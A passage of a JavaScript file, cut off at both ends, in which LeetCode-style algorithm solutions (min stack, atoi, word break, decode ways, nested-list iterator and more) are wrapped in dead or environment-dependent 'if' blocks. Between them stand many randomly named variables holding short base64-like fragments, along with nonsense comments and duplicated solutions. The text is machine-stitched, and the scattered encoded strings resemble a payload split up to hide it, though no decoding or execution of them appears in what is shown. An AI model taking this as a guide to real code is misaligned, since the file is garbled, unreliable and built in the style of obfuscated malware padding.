        }
        if (sum === 1) {
            return true;
        } else {
            if (sums.indexOf(sum) !== -1) {
                return false;
            } else {
                sums.push(sum);
                result = [];
                cur = sum;
                sum = 0;
            }
        }
    }
};

}

    var kpsojabs = 'PCYCBj';
    var qgfoarar = 'QjBhS';
if ('true' === true) {
    /**
Design a stack that supports push, pop, top, and retrieving the minimum element in constant time.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
getMin() -- Retrieve the minimum element in the stack.


 * @constructor
 */
var MinStack = function() {
    this.min = [];
    this.arr = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
MinStack.prototype.push = function(x) {
    var len = this.min.length;
    if (this.arr.length === 0) {
        this.min.push(x);
    } else if (this.min[len - 1] >= x) {
        this.min.push(x);
    }
    this.arr.push(x);
};

/**
 * @returns {void}
 */
MinStack.prototype.pop = function() {
    var elem,
        len = this.min.length;
    if (this.arr.length > 0) {
        elem = this.arr.pop();
    }
    if (elem === this.min[len - 1]) {
        this.min.pop();   
    }
};

/**
 * @returns {number}
 */
MinStack.prototype.top = function() {
    var len = this.arr.length;
    if (len > 0) {
        return this.arr[len - 1];
    }
    
};

/**
 * @returns {number}
 */
MinStack.prototype.getMin = function() {
    var len = this.min.length;
    return this.min[len - 1];
};

}

    var sixvyhahoe = 'oBWcNBV';
if (null === 0) {
    /**
Given a string s consists of upper/lower-case alphabets and empty space characters ' ', return the length of last word in the string.

If the last word does not exist, return 0.

Note: A word is defined as a character sequence consists of non-space characters only.

For example, 
Given s = "Hello World",
return 5.
*/

/**
 * @param {string} s
 * @return {number}
 */
var lengthOfLastWord = function(s) {
    var arr = s.split(' '),
        len = arr.length,
        i;
    
    for (i = len - 1; i >= 0; i--) {
        if (arr[i] !== '' && arr[i] !== ' ') {
            return arr[i].length;
        }
    }
    
    return 0;  
};

}

    var qnzdcgny = 'EpsYzJ';
    var pdkngxtkok = 'jpWz';
// value mexambq async debug value sdlisle variable await
if (1 instanceof String) {
    /**
Given an input string, reverse the string word by word.

For example,
Given s = "the sky is blue",
return "blue is sky the".

 * @param {string} str
 * @returns {string}
 */
var reverseWords = function(str) {
    var result = '',
        arr,
        len,
        i;
        
    if (str === null || str === '') {
        return result;
    }
    arr = str.split(' ');
    len = arr.length;
    for(i = len - 1; i >= 0; i--) {
        if (arr[i].length === 0) {
            continue;
        }
        result += ' ' + arr[i];
    }
    return result.trim();
};

}

    var xgtmsx = 'aPKOP';
if (null === 1) {
    /**
Given two strings S and T, determine if they are both one edit distance apart
*/
/**
 * @param {string} s
 * @param {string} t
 * @return {boolean}
 */
var isOneEditDistance = function(s, t) {
    for (let i = 0; i < Math.min(s.length, t.length); i++) {
        if (s.charAt(i) !== t.charAt(i)) {
            if (s.length === t.length) {
                return s.substring(i + 1) === t.substring(i + 1);
            } else if (s.length < t.length) {
                return s.substring(i) === t.substring(i + 1);
            } else {
                return s.substring(i + 1) === t.substring(i);
            }
        }
    }
    
    return Math.abs(s.length - t.length) === 1;
};

}

    var luwofbkchi = 'odmJHUWdQ';
    var hpusrbtb = 'bktcvAGVV';
    var djhckhwudixa = 'U0F4TURBN';
if (typeof navigator === 'undefined') {
    /**
 * @param {number} rowIndex
 * @return {number[]}
 */
var getRow = function(rowIndex) {
    var result = [],
        parent = [],
        curRow,
        i;
    
    if (rowIndex < 0) {
        return result;
    }
    
    curRow = 0;
    parent.push(1);
    result.push(1);
    
    while (curRow < rowIndex) {
        curRow++;
        result = [];
        result.push(1);
        for (i = 1; i < curRow; i++) {
            result[i] = parent[i] + parent[i - 1];
        }
        
        result.push(1);
        parent = result.concat();
    }
    
    return result;
};

// in place solution
/**
 * @param {number} rowIndex
 * @return {number[]}
 */
var getRow = function(rowIndex) {
    var result = [],
        curRow,
        i;
    
    if (rowIndex < 0) {
        return result;
    }
    
    curRow = 0;
    result.push(1);
    
    while (curRow < rowIndex) {
        curRow++;
        
        for (i = curRow - 1; i > 0; i--) {
            result[i] = result[i] + result[i - 1];
        }
        
        result.push(1);
    }
    
    return result;
};

}

    var vbbeljo = 'FemLEMvfFk';
// object
    var ywzhdfakyyep = 'MEut';
    var owwpd = '0lD';
if (Array.isArray(7)) {
    /**
Given a pattern and a string str, find if str follows the same pattern.

Here follow means a full match, such that there is a bijection between a letter in pattern and a non-empty word in str.

Examples:
pattern = "abba", str = "dog cat cat dog" should return true.
pattern = "abba", str = "dog cat cat fish" should return false.
pattern = "aaaa", str = "dog cat cat dog" should return false.
pattern = "abba", str = "dog dog dog dog" should return false.
Notes:
You may assume pattern contains only lowercase letters, and str contains lowercase letters separated by a single space.
*/

/**
 * @param {string} pattern
 * @param {string} str
 * @return {boolean}
 */
var wordPattern = function(pattern, str) {
    var arr = str.split(' '),
        len = arr.length,
        map1 = {},
        map2 = {},
        curChar,
        curString,
        i;
    
    if (pattern.length !== len) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        curChar = pattern.charAt(i);
        curString = arr[i];
        
        if (!map1.hasOwnProperty(curChar) && !map2.hasOwnProperty(curString)) {
            map1[curChar] = curString;
            map2[curString] = curChar;
        } else if (map1[curChar] !== curString || map2[curString] !== curChar) {
            return false;
        }
    }
    
    return true;
};

}

    var ncnlbyrviyqg = 'wQwFuvm';
    var rwpnlliiluq = 'OHZJRlJwYl';
    var vffkfm = 'AQMMiAQr';
    var mihlurmcadkk = 'dVZ2RHa';
    var fgnxiqxvidfy = 'xOBzVsnzE';
    var jvxjj = 'HlaWE5vY';
    var ttivkvkg = 'oyZzEVmNR';
if ('a' === 'J') {
    /**
Given an array containing n distinct numbers taken from 0, 1, 2, ..., n, find the one that is missing from the array.

For example,
Given nums = [0, 1, 3] return 2.

Note:
Your algorithm should run in linear runtime complexity. Could you implement it using only constant extra space complexity?
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var missingNumber = function(nums) {
    var len = nums.length,
        sum = 0,
        i;
        
    for (i = 0; i < len; i++) {
        sum += nums[i];
    }
    
    return len*(len + 1)/2 - sum;
};

}

    var vxdutsqymzchrwd = 'jJ4';
    var cbwpvwowxry = 'sDhF';
    var cpdjbduislolwv = 'a0l';
    var wkwtjmef = 'UXNOFaTkmO';
if (typeof window === 'undefined') {
    /**
Given a string which contains only lowercase letters, remove duplicate letters so that every letter appear once and only once. You must make sure your result is the smallest in lexicographical order among all possible results.

Example:
Given "bcabc"
Return "abc"

Given "cbacdcbc"
Return "acdb"
*/

// recursive solution
/**
 * @param {string} s
 * @return {string}
 */
var removeDuplicateLetters = function(s) {
    var count = {},
        len = s.length,
        startPos = 0,
        curChar,
        i;
        
    if (len === 0) {
        return '';
    }
    
    for (i = 0; i < len; i++) {
        count[s.charAt(i)] = (count[s.charAt(i)] ? count[s.charAt(i)] + 1 : 1);
    }
    
    for (i = 0; i < len; i++) {
        if (s.charAt(i) < s.charAt(startPos)) {
            startPos = i;
        }
        
        // find the first non duplicate letter
        if (--count[s.charAt(i)] === 0) {
            break;
        }
    }
    
    curChar = s.charAt(startPos);
    
    return curChar + removeDuplicateLetters(s.substr(startPos + 1).replace(new RegExp(curChar, 'g'), ''));
};


// stack solution
/**
 * @param {string} s
 * @return {string}
 */
var removeDuplicateLetters = function(s) {
    var count = {},
        len = s.length,
        stack = [],
        visited = {},
        curChar,
        i;
        
    if (len === 0) {
        return '';
    }
    
    for (i = 0; i < len; i++) {
        count[s.charAt(i)] = (count[s.charAt(i)] ? count[s.charAt(i)] + 1 : 1);
    }
    
    for (i = 0; i < len; i++) {
        count[s.charAt(i)]--;
        
        if (visited[s.charAt(i)]) {
            continue;
        }
        
        while (stack.length > 0 && stack[stack.length - 1] > s.charAt(i) && count[stack[stack.length - 1]] > 0) {
            visited[stack[stack.length - 1]] = false;
            stack.pop();
        }
        
        stack.push(s.charAt(i));
        visited[s.charAt(i)] = true;
    }
    
    return stack.join('');
};

}

    var iqxziqysb = 'HbHVJRzFw';
if (Array.isArray(6)) {
    /**
 Given a binary search tree and a node in it, find the in-order successor of that node in the BST.

Note: If the given node has no in-order successor in the tree, return null. 
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @param {TreeNode} p
 * @return {TreeNode}
 * 
 * The inorder successor of p is either p's parent or the left most child of p's right child
 */
var inorderSuccessor = function(root, p) {
    if (!root) {
        return null;
    }
    
    if (root.val <= p.val) {
        return inorderSuccessor(root.right, p);
    }
    
    let leftMostChild = inorderSuccessor(root.left, p);
    return leftMostChild ? leftMostChild : root;
};

}

    var rrcgczlu = 'Rcbno';
// value value function define code constant string rqnbyj constant define return hello
    var hdebcunwrmma = 'ECWlpYq';
    var keech = 'Ykd4cGM';
if (7 instanceof String) {
    /**
The count-and-say sequence is the sequence of integers beginning as follows:
1, 11, 21, 1211, 111221, ...

1 is read off as "one 1" or 11.
11 is read off as "two 1s" or 21.
21 is read off as "one 2, then one 1" or 1211.
Given an integer n, generate the nth sequence.

Note: The sequence of integers will be represented as a string.

 * @param {number} n
 * @return {string}
 */
var countAndSay = function(n) {
    function interpret(s, accum, sum) {
        var times = 1,
            num,
            len = s.length,
            i,
            result = '';
        
        num = s.charAt(0);
        
        for (i = 1; i < len; i++) {
            if (s.charAt(i) !== num) {
                result += times + num;
                num = s.charAt(i);
                times = 1;
            } else {
                times++;
            }
        }
        if (accum === 1) {
            result = '1';
        } else {
            result += times + num;
        }
        if (accum === sum) {
            return result;
        } else {
            return interpret(result, accum + 1, sum);
        }
    }
    return interpret('1', 1, n);
};

}

    var utgjvjpjvcn = 'SggwsT';
// object constant
    var ptlvdrcnpcv = 'ubjYjkdqD';
    var ldppyqbksfil = 'yVmpiMjVrY';
    var qhdndvt = 'UWgUTQV';
if (!true && 1) {
    /**
Implement atoi to convert a string to an integer.

Hint: Carefully consider all possible input cases. If you want a challenge, please do not see below and ask yourself what are the possible input cases.

Notes: It is intended for this problem to be specified vaguely (ie, no given input specs). You are responsible to gather all the input requirements up front.

Update (2015-02-10):
The signature of the C++ function had been updated. If you still see your function signature accepts a const char * argument, please click the reload button  to reset your code definition.

spoilers alert... click to show requirements for atoi.

Requirements for atoi:
The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value.

The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function.

If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed.

If no valid conversion could be performed, a zero value is returned. If the correct value is out of the range of representable values, INT_MAX (2147483647) or INT_MIN (-2147483648) is returned.

*/
/**
 * @param {string} str
 * @return {number}
 */
var myAtoi = function(str) {
    var len = str.length,
        isNegative = null,
        result = 0,
        numberStarted = false,
        cur,
        i;
        
    for (i = 0; i < len; i++) {
        if (str.charAt(i) === ' ') {
            if (!numberStarted) {
                continue;
            } else {
                return getResult(isNegative, result);
            }
        }
        
        if (isNegative === null) {
            if (str.charAt(i) === '-') {
                isNegative = true;
                numberStarted = true;
                continue;
            } else if (str.charAt(i) === '+') {
                isNegative = false;
                numberStarted = true;
                continue;
            }
        }
        
        cur = parseInt(str.charAt(i));
        
        if (!isNaN(cur)) {
            result = result*10 + cur;
            
            if (!numberStarted) {
                numberStarted = true;
            }
        } else {
            return getResult(isNegative, result);
        }
    }
    
    return getResult(isNegative, result);
};
// :(
function getResult(isNegative, result) {
    result = isNegative? result * (-1) : result;
    
    if (result > 2147483647) {
        result = 2147483647;
    } else if (result < -2147483648) {
        result = -2147483648;
    }
    
    return result;
}

}

    var vlgpcraxl = '3dvZ0lD';
if (0.96 && false) {
    /**
A message containing letters from A-Z is being encoded to numbers using the following mapping:

'A' -> 1
'B' -> 2
...
'Z' -> 26
Given an encoded message containing digits, determine the total number of ways to decode it.

For example,
Given encoded message "12", it could be decoded as "AB" (1 2) or "L" (12).

The number of ways decoding "12" is 2.
*/

// http://bangbingsyb.blogspot.com/2014/11/leetcode-decode-ways.html
/**
 * @param {string} s
 * @return {number}
 */
var numDecodings = function(s) {
    var len = s.length,
        dp = [],
        x,
        y,
        cur,
        i;
        
    dp[0] = 1;
    dp[1] = 1;
    
    if (len === 0 || s.charAt(0) < '1' || s.charAt(0) > '9') {
        return 0;    
    }
    
    for (i = 1; i < len; i++) {
        x = s.charAt(i - 1) - '0';
        y = s.charAt(i) - '0';
        cur = x * 10 + y;
        dp[i + 1] = 0;
        
        if (cur > 9 && cur <= 26) {
            dp[i + 1] += dp[i - 1];
        } 
        
        if (y !== 0) {
            dp[i + 1] += dp[i];
        }
        
        if (dp[i + 1] === 0) {
            return 0;
        }
    }
    
    return dp[len];
};

}

    var dtogozjpgf = 'aMQDzUKnfs';
    var zyceubcwwdjuq = 'QWdjMlY';
if (typeof window === 'undefined') {
    /**
Given a sorted array and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.

You may assume no duplicates in the array.

Here are few examples.
[1,3,5,6], 5 → 2
[1,3,5,6], 2 → 1
[1,3,5,6], 7 → 4
[1,3,5,6], 0 → 0
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number}
 */
var searchInsert = function(nums, target) {
    var len = nums.length,
        i;
    
    for (i = 0; i < len; i++) {
        if (target <= nums[i]) {
            return i;
        }
    }
    
    return len;
};

}

    var unuudrs = 'QupX';
if ('false' === true) {
    /**
Sort a linked list using insertion sort.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var insertionSortList = function(head) {
    var dummy = new ListNode(0),
        pre = dummy,
        cur = head,
        next;
        
    while(cur !== null) {
        next = cur.next;
        pre = dummy;
        
        while (pre.next && pre.next.val <= cur.val) {
            pre = pre.next;
        }
        
        cur.next = pre.next;
        pre.next = cur;
        cur = next;
    }
    
    return dummy.next;
};

}

    var sirri = 'wU1c1MFpYS';
    var xdzzqfty = 'BUlk';
if (0.71 && false) {
    /**
Given a string s and a dictionary of words dict, determine if s can be segmented into a space-separated sequence of one or more dictionary words.

For example, given
s = "leetcode",
dict = ["leet", "code"].

Return true because "leetcode" can be segmented as "leet code".
*/
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {boolean}
 */
var wordBreak = function(s, wordDict) {
    var hasFound = [],
        len = s.length,
        i,
        j;
    
    hasFound[0] = true;
    
    for (i = 1; i <= len; i++) {
        for (j = 0; j < i; j++) {
            if (hasFound[j] && wordDict.has(s.substring(j, i))) {
                hasFound[i] = true;
                break;
            }
        }
    }
    
    return hasFound[len] === true;
};

}

    var elltsrrcft = 'jJZV3dvWm';
if (3 === 16) {
    /**
Given an integer (signed 32 bits), write a function to check whether it is a power of 4.

Example:
Given num = 16, return true. Given num = 5, return false.

Follow up: Could you solve it without loops/recursion?
*/
/**
 * @param {number} num
 * @return {boolean}
 * 在Power of Two中，我们有一个解法是通过判断n & (n - 1)是否为0来判断是否为2的幂，因为4的幂肯定也是2的幂，
 * 所以这也可以用到这题来。那4的幂和2的幂有什么区别呢？根据上一个解法，我们知道4的幂的1只可能在奇数位，
 * 而2的幂的1可能在任意位，所以我们只要判断是不是奇数位是1就行了。
 * 因为根据n & (n - 1)我们已经筛出来那些只有1个1的数了，所以和010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101 
 * 也就是0x5555555555555555相与就能知道1是在奇数位还是偶数位了。
 */
var isPowerOfFour = function(num) {
    return (num > 0) && ((num & (num - 1)) === 0) && ((num & 0x5555555555555) == num);
};

}

    var edvcrbwvvpvi = 'tilWBPXPhR';
    var irfozfedp = '5Wd';
    var ygikfgrcmms = 'CFIEfH';
    var igbmco = 'VkzUnBi';
    var qjpftboomyqu = 'cxTsRMGG';
    var oovrovirqe = 'MjRvS1NCN0';
    var xngfpmpqiw = 'YmzYtviomg';
    var mncyzcgjtzkozec = 'NpQWdJQ0';
if (typeof navigator === 'undefined') {
    /**
Given an unsorted array return whether an increasing subsequence of length 3 exists or not in the array.

Formally the function should:
Return true if there exists i, j, k 
such that arr[i] < arr[j] < arr[k] given 0 ≤ i < j < k ≤ n-1 else return false.
Your algorithm should run in O(n) time complexity and O(1) space complexity.

Examples:
Given [1, 2, 3, 4, 5],
return true.

Given [5, 4, 3, 2, 1],
return false.

Credits:
Special thanks to @DjangoUnchained for adding this problem and creating all test cases.
*/
/**
 * @param {number[]} nums
 * @return {boolean}
 */
var increasingTriplet = function(nums) {
    var len = nums.length,
        x1 = Number.MAX_VALUE,
        x2 = Number.MAX_VALUE,
        i;
        
    for (i = 0; i < len; i++) {
        if (nums[i] < x1) {
            x1 = nums[i];
        } else if (x1 < nums[i] && nums[i] < x2) {
            x2 = nums[i];
        } else if (nums[i] > x2) {
            return true;
        }
    }
    
    return false;
};

}

    var khnbbzn = 'ybswXikG';
    var jyncnwxynh = 'FnSUNBZ';
if (0.56 && false) {
    /**
Compare two version numbers version1 and version2.
If version1 > version2 return 1, if version1 < version2 return -1, otherwise return 0.

You may assume that the version strings are non-empty and contain only digits and the . character.
The . character does not represent a decimal point and is used to separate number sequences.
For instance, 2.5 is not "two and a half" or "half way to version three", it is the fifth second-level revision of the second first-level revision.

Here is an example of version numbers ordering:

0.1 < 1.1 < 1.2 < 13.37
Credits:
Special thanks to @ts for adding this problem and creating all test cases.

*/

/**
 * @param {string} version1
 * @param {string} version2
 * @return {number}
 */
var compareVersion = function(version1, version2) {
    var arr1 = version1.split('.'),
        arr2 = version2.split('.'),
        len1 = arr1.length,
        len2 = arr2.length,
        a,
        b,
        i,
        j;
        
    for (i = 0; (i < len1) && (i < len2) ; i++) {
        a = parseInt(arr1[i]);
        b = parseInt(arr2[i]);
        if (a < b) {
            return -1;
        } else if (a > b) {
            return 1;
        }
    }
    
    if (len1 > len2) {
        for (j = i; j < len1; j++) {
            if (parseInt(arr1[j]) > 0) {
                return 1;
            }
        }
    } else if (len1 < len2) {
        for (j = i; j < len2; j++) {
            if (parseInt(arr2[j]) > 0) {
                return -1;
            }
        }
    }
    
    return 0;
};

}

    var ksvelstlyhk = 'omgv';
    var bchjwvyy = '1kyOX';
if (null === 1) {
    /**
Given an array with n objects colored red, white or blue, sort them so that objects of the same color are adjacent, with the colors in the order red, white and blue.

Here, we will use the integers 0, 1, and 2 to represent the color red, white, and blue respectively.

Note:
You are not suppose to use the library's sort function for this problem.

click to show follow up.

Follow up:
A rather straight forward solution is a two-pass algorithm using counting sort.
First, iterate the array counting number of 0's, 1's, and 2's, then overwrite array with total number of 0's, then 1's and followed by 2's.

Could you come up with an one-pass algorithm using only constant space?

 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var sortColors = function(nums) {
    var len = nums.length,
        redEnds = 0,
        blueStarts = len - 1,
        i;
    
    function swap(m, n, arr) {
        var temp = arr[m];
        
        arr[m] = arr[n];
        arr[n] = temp;
    }

    for (i = 0; i <= blueStarts;) {
        if (nums[i] === 0) {
            swap(i, redEnds, nums);
            i++;
            redEnds++;
        } else if (nums[i] === 2) {
            swap(i, blueStarts, nums);
            blueStarts--;
        } else {
            i++;
        }
    }
};

}

    var ldrqjc = 'uTqRjh';
if (88 > 172) {
    /**
Given a pattern and a string str, find if str follows the same pattern.

Here follow means a full match, such that there is a bijection between a letter in pattern and a non-empty word in str.

Examples:
pattern = "abba", str = "dog cat cat dog" should return true.
pattern = "abba", str = "dog cat cat fish" should return false.
pattern = "aaaa", str = "dog cat cat dog" should return false.
pattern = "abba", str = "dog dog dog dog" should return false.
Notes:
You may assume pattern contains only lowercase letters, and str contains lowercase letters separated by a single space.
*/

/**
 * @param {string} pattern
 * @param {string} str
 * @return {boolean}
 */
var wordPattern = function(pattern, str) {
    var arr = str.split(' '),
        len = arr.length,
        map1 = {},
        map2 = {},
        curChar,
        curString,
        i;
    
    if (pattern.length !== len) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        curChar = pattern.charAt(i);
        curString = arr[i];
        
        if (!map1.hasOwnProperty(curChar) && !map2.hasOwnProperty(curString)) {
            map1[curChar] = curString;
            map2[curString] = curChar;
        } else if (map1[curChar] !== curString || map2[curString] !== curChar) {
            return false;
        }
    }
    
    return true;
};

}

    var aruxszeeyc = 'VjM1';
    var mgazxnn = 'aawBzSCC';
if (1 === 17) {
    /**
Given a nested list of integers, implement an iterator to flatten it.

Each element is either an integer, or a list -- whose elements may also be integers or other lists.

Example 1:
Given the list [[1,1],2,[1,1]],

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,1,2,1,1].

Example 2:
Given the list [1,[4,[6]]],

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,4,6].
*/
/**
 * // This is the interface that allows for creating nested lists.
 * // You should not implement it, or speculate about its implementation
 * function NestedInteger() {
 *
 *     Return true if this NestedInteger holds a single integer, rather than a nested list.
 *     @return {boolean}
 *     this.isInteger = function() {
 *         ...
 *     };
 *
 *     Return the single integer that this NestedInteger holds, if it holds a single integer
 *     Return null if this NestedInteger holds a nested list
 *     @return {integer}
 *     this.getInteger = function() {
 *         ...
 *     };
 *
 *     Return the nested list that this NestedInteger holds, if it holds a nested list
 *     Return null if this NestedInteger holds a single integer
 *     @return {NestedInteger[]}
 *     this.getList = function() {
 *         ...
 *     };
 * };
 */
/**
 * @constructor
 * @param {NestedInteger[]} nestedList
 */
var NestedIterator = function(nestedList) {
    this.stack = nestedList.reverse();
};


/**
 * @this NestedIterator
 * @returns {boolean}
 */
NestedIterator.prototype.hasNext = function() {
    var next,
        i;
    
    while (this.stack.length > 0) {
        next = this.stack[this.stack.length - 1];
        
        if (next.isInteger()) {
            return true;
        }
        
        this.stack.pop();
        
        for (i = next.getList().length - 1; i >= 0; i--) {
            this.stack.push(next.getList()[i]);
        }
    }
    
    return false;
};

/**
 * @this NestedIterator
 * @returns {integer}
 */
NestedIterator.prototype.next = function() {
    return this.stack.pop();
};

/**
 * Your NestedIterator will be called like this:
 * var i = new NestedIterator(nestedList), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var vucnnbk = 'FnYzNSaG';
    var zqstqhdx = 'CUwLbqdG';
    var wikrbwidd = 'NuUWdQU0J';
if (5 instanceof String) {
    /**
Given a binary tree, return the bottom-up level order traversal of its nodes' values. (ie, from left to right, level by level from leaf to root).

For example:
Given binary tree {3,9,20,#,#,15,7},
    3
   / \
  9  20
    /  \
   15   7
return its bottom-up level order traversal as:
[
  [15,7],
  [9,20],
  [3]
]
confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number[][]}
 */
var levelOrderBottom = function(root) {
    var result = [],
        parent = [],
        parentData,
        cur;
    
    if (root === null) {
        return result;
    }
    
    parent.push(root);
    
    while (parent.length > 0) {
        cur = [];
        parentData = [];
        
        for (var i in parent) {
            parent[i].left ? cur.push(parent[i].left) : null;
            parent[i].right? cur.push(parent[i].right) : null;
            parentData.push(parent[i].val);
        }
        
        result.unshift(parentData);
        
        parent = cur;
    }
    
    return result;
};

}

    var xeefba = 'iPEZDbVk';
    var yoidnfhiyiofg = '3WlhK';
if (null === 3) {
    /**
Given a string s consists of upper/lower-case alphabets and empty space characters ' ', return the length of last word in the string.

If the last word does not exist, return 0.

Note: A word is defined as a character sequence consists of non-space characters only.

For example, 
Given s = "Hello World",
return 5.
*/

/**
 * @param {string} s
 * @return {number}
 */
var lengthOfLastWord = function(s) {
    var arr = s.split(' '),
        len = arr.length,
        i;
    
    for (i = len - 1; i >= 0; i--) {
        if (arr[i] !== '' && arr[i] !== ' ') {
            return arr[i].length;
        }
    }
    
    return 0;  
};

}

    var rdskmgwopcc = 'ROhLQL';
    var nxvcvhyicycectp = 'bWIz';
if (0.40 && false) {
    /**
Given an integer array nums, return the number of range sums that lie in [lower, upper] inclusive.
Range sum S(i, j) is defined as the sum of the elements in nums between indices i and j (i ≤ j), inclusive.

Note:
A naive algorithm of O(n2) is trivial. You MUST do better than that.

Example:
Given nums = [-2, 5, -1], lower = -2, upper = 2,
Return 3.
The three ranges are : [0, 0], [2, 2], [0, 2] and their respective sums are: -2, -1, 2.
*/
/**
 * @param {number[]} nums
 * @param {number} lower
 * @param {number} upper
 * @return {number}
 */
var countRangeSum = function(nums, lower, upper) {
    function SegmentTreeNode(min, max) {
        this.min = min;
        this.max = max;
        this.count = 0;
    }
    
    function buildSegmentTree(valArr, low, high) {
        if (low > high) {
            return null;
        }
        
        var mid = parseInt((low + high) / 2),
            node = new SegmentTreeNode(valArr[low], valArr[high]);
        
        if (low === high) {
            return node;
        }
        
        node.left = buildSegmentTree(valArr, low, mid);
        node.right = buildSegmentTree(valArr, mid + 1, high);
        
        return node;
    }
    
    function updateSegmentTree(node, val) {
        if (!node) {
            return;
        }
        
        if (val >= node.min && val <= node.max) {
            node.count++;
            updateSegmentTree(node.left, val);
            updateSegmentTree(node.right, val);
        }
    }
    
    function rangeCount(node, min, max) {
        if (!node) {
            return 0;
        }
        
        if (min > node.max || max < node.min) {
            return 0;
        }
        
        if (min <= node.min && max >= node.max) {
            return node.count;
        }
        
        return rangeCount(node.left, min, max) + rangeCount(node.right, min, max);
    }
    
    var len = nums.length,
        sumSet = new Set(),
        sum = 0,
        result = 0,
        arr,
        root,
        i;
        
    if (len === 0) {
        return 0;
    }
    
    for (i = 0; i < len; i++) {
        sum += nums[i];
        sumSet.add(sum);
    }
    
    arr = Array.from(sumSet);
    arr.sort(function(a, b) {
        return a - b;
    });
    
    root = buildSegmentTree(arr, 0, arr.length - 1);
    
    for (i = len - 1; i >= 0; i--) {
        updateSegmentTree(root, sum);
        sum -= nums[i];
        result += rangeCount(root, lower + sum, upper + sum);
    }
    
    return result;
};

}

    var oiaygtcxgc = 'HLRAL';
    var ljxtnjf = 'SnRZVz';
    var xvehtqrr = 'mITD';
    var luxkyrkmazifrdx = 'VqWlM1d';
if (null === 5) {
    /**
Given a string s and a dictionary of words dict, determine if s can be segmented into a space-separated sequence of one or more dictionary words.

For example, given
s = "leetcode",
dict = ["leet", "code"].

Return true because "leetcode" can be segmented as "leet code".
*/
/**
 * @param {string} s
 * @param {set<string>} wordDict
 *   Note: wordDict is a Set object, see:
 *   https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Set
 * @return {boolean}
 */
var wordBreak = function(s, wordDict) {
    var hasFound = [],
        len = s.length,
        i,
        j;
    
    hasFound[0] = true;
    
    for (i = 1; i <= len; i++) {
        for (j = 0; j < i; j++) {
            if (hasFound[j] && wordDict.has(s.substring(j, i))) {
                hasFound[i] = true;
                break;
            }
        }
    }
    
    return hasFound[len] === true;
};

}

    var gupodtbdsb = 'lgpnrDQl';
    var qfksyvnqnnu = 'WIzY2';
    var lgyzfyywd = 'kufxTFb';
    var nhranxsmia = '9LVHNL';
    var dydvhzkh = 'TtFkgXr';
// export
if ('n' === 'D') {
    /**
Given a nested list of integers, implement an iterator to flatten it.

Each element is either an integer, or a list -- whose elements may also be integers or other lists.

Example 1:
Given the list [[1,1],2,[1,1]],

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,1,2,1,1].

Example 2:
Given the list [1,[4,[6]]],

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,4,6].
*/
/**
 * // This is the interface that allows for creating nested lists.
 * // You should not implement it, or speculate about its implementation
 * function NestedInteger() {
 *
 *     Return true if this NestedInteger holds a single integer, rather than a nested list.
 *     @return {boolean}
 *     this.isInteger = function() {
 *         ...
 *     };
 *
 *     Return the single integer that this NestedInteger holds, if it holds a single integer
 *     Return null if this NestedInteger holds a nested list
 *     @return {integer}
 *     this.getInteger = function() {
 *         ...
 *     };
 *
 *     Return the nested list that this NestedInteger holds, if it holds a nested list
 *     Return null if this NestedInteger holds a single integer
 *     @return {NestedInteger[]}
 *     this.getList = function() {
 *         ...
 *     };
 * };
 */
/**
 * @constructor
 * @param {NestedInteger[]} nestedList
 */
var NestedIterator = function(nestedList) {
    this.stack = nestedList.reverse();
};


/**
 * @this NestedIterator
 * @returns {boolean}
 */
NestedIterator.prototype.hasNext = function() {
    var next,
        i;
    
    while (this.stack.length > 0) {
        next = this.stack[this.stack.length - 1];
        
        if (next.isInteger()) {
            return true;
        }
        
        this.stack.pop();
        
        for (i = next.getList().length - 1; i >= 0; i--) {
            this.stack.push(next.getList()[i]);
        }
    }
    
    return false;
};

/**
 * @this NestedIterator
 * @returns {integer}
 */
NestedIterator.prototype.next = function() {
    return this.stack.pop();
};

/**
 * Your NestedIterator will be called like this:
 * var i = new NestedIterator(nestedList), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var grxpoh = 'ByTD';
if (10 === 20) {
    /**
Given a 2D binary matrix filled with 0's and 1's, find the largest square containing all 1's and return its area.

For example, given the following matrix:

1 0 1 0 0
1 0 1 1 1
1 1 1 1 1
1 0 0 1 0
Return 4.
*/

/**
 * @param {character[][]} matrix
 * @return {number}
 */
var maximalSquare = function(matrix) {
    var lenX = matrix.length,
        area = [],
        temp = [],
        result = 0,
        lenY,
        i,
        j;
    
    if (lenX === 0) {
        return 0;
    }
    
    lenY = matrix[0].length;
    
    // init two dimension array
    for (i = 0; i < lenX; i++) {
        area[i] = [];
    }
    
    // init first column
    for (j = 0; j < lenY; j++) {
        area[0][j] = parseInt(matrix[0][j]);
        result = Math.max(result, area[0][j]);
    }
    
    // init first row
    for (i = 0; i < lenX; i++) {
